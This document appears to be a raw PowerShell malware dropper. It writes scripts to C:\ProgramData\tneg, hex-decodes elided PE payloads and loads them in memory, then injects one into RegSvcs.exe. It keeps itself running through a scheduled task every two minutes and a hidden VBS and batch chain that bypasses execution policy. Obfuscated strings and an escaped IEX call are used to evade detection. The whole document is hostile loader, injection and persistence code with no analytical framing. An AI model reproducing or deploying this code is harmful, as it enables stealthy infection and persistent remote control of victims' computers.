$swvr = "C:\ProgramData\tneg"
New-Item $swvr -ItemType Directory -Force
$Content = @'
function lajt {
param($ylph)$ylph = $ylph -split '(..)' | ? { $_ }
ForEach ($ejql in $ylph)
{
[Convert]::ToInt32($ejql,16)
}
}
Try{
$fsct  = '4D5A900003...000000000' # NOTE: The actual 103424-character Base64 string omitted for readability.
}catch{}
Try{
$gjxd = '4D5A90000300000...00000000' # NOTE: The actual 130048-character Base64 string omitted for readability.
}catch{}
Try{
[Byte[]] $lajt = lajt $ejql
[Byte[]] $btyf = lajt $fsct
[Byte[]] $wtlq = lajt $gjxd
$zfkl = [Ref].Assembly
$dcfa = $zfkl::'Load'(($btyf))
}catch{}
Try{
$nkyc = 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcfsqdumoixkczgaes.exe'
$dcfa.'GetType'('NewfsqdumoixkczgaePE.PE'.replace('fsqdumoixkczgae','')).GetMethod('Exfsqdumoixkczgaeecufsqdumoixkczgaete'.replace('fsqdumoixkczgae','')).'Invoke'($null,($nkyc.replace('fsqdumoixkczgae',''),$wtlq))
$null,[object[]] $nkyc
}catch{}
'@
[IO.File]::WriteAllText("C:\ProgramData\tneg\sfqn.ps1", $Content)
Sleep 1
$Content = @'
try 
{
&'schtasks.exe' '/create' '/sc' 'minute' '/mo' 2 '/tn' ''tneg '/tr' (('C:\ProgramData\tneg\tneg.vbs'));
} catch { }
'@
[IO.File]::WriteAllText("C:\ProgramData\tneg\tneg.ps1", $Content)
$Content = @'
on error resume next
WScript.Sleep 10000
set cxvj = CreateObject("WScript.Shell")
cxvj.run "C:\ProgramData\tneg\1.bat",0
'@
[IO.File]::WriteAllText("C:\ProgramData\tneg\tneg.vbs", $Content)
$Content = @'
CMD /C powershell -NOP -WIND HIDDEN -eXEC BYPASS -NONI "C:\ProgramData\tneg\sfqn.ps1"
'@
[IO.File]::WriteAllText("C:\ProgramData\tneg\1.bat", $Content)
Start-Sleep 10
I`E`X([IO.File]::ReadAllText('C:\ProgramData\tneg\tneg.ps1'))
